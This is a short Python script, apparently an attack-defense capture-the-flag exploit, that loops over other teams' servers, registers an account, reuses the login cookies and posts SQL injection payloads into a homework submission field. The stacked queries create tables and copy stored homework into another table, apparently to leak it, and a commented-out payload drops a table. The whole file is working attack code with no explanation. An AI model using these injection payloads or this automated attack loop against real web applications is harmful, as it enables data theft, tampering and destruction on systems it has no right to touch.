import requests

while 1 == 1:
    for i in range(12):
        if i != 3:
            continue
        try:
            site = 'http://ctfteam%d.mit.edu:3000' % (i+2)
            print site
            user_data = {'username' : 'FooBarBaz', 'password' : 'HelloWorld', 'type' : 'student'}
            r = requests.post(site + '/signup/', data=user_data)
            print r.text

            r = requests.post(site + '/login/', data=user_data)
            print r.text
            myCookies = dict()
            myCookies['id'] = r.cookies['id']
            myCookies['login'] = r.cookies['login']
            myCookies['teacher'] = r.cookies['teacher']

            evil = {'assignment' : "Derp'); CREATE TABLE assignments (class_id integer, student_id integer, homework text); CREATE TABLE users (user_id integer, username text, salt text, password text, teacher boolean); --"}
            r = requests.post(site + '/homework/1/', cookies=myCookies, data=evil)
            print r.text

            evil = {'assignment' : "Werp'); INSERT INTO classes (class_id, name) SELECT RANDOM() * 100000, homework FROM assignments; --"}
            r = requests.post(site + '/homework/1/', cookies=myCookies, data=evil)
            print r.text

            #evil = {'assignment' : "Herp'); DROP TABLE assignments; --"}
            #r = requests.post(site + '/homework/2/', cookies=myCookies, data=evil)
            #print r.text
        except Exception:
            pass

